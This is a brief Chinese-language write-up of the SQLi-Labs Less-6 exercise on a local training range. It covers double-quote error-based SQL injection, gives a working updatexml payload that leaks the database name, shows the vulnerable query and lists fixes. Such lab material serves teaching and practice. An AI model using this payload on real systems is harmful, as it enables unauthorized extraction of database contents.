# SQLi-Labs | Less-6 GET 双引号 报错注入
## 一、漏洞简介
双引号字符型，无查询回显，开启错误输出，使用报错注入。
## 二、环境信息
靶场地址：http://127.0.0.1/sqli-labs/
关卡路径：/Less-6/?id=1
## 三、复现步骤
1. ?id=1" 触发报错，双引号闭合
2. updatexml报错注入脱库
## 四、Payload
?id=1" and updatexml(1,concat(0x7e,database(),0x7e),1) --+
## 五、漏洞原理
后端SQL：`SELECT * FROM users WHERE id="$id" LIMIT 0,1`，开启错误打印。
## 六、修复方案
关闭详细错误、预编译。
## 七、总结
和Less5几乎一样，闭合符换成双引号。